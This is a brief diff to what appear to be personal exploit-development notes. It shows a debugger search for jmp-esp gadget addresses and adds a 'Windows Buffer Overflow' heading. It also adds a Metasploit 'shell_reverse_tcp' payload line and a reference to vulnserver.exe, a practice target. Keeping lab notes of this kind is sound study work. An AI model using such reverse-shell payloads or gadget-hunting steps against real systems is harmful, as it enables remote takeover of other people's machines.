@@ -816,8 +816,10 @@ find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
 0xf7f6674b
 0xf7f72753
 
+_____Windows Buffer Overflow_____
 
-
+use payload/windows/shell_reverse_tcp
+stephenbradshaw/vulnserver.exe
 
 
 
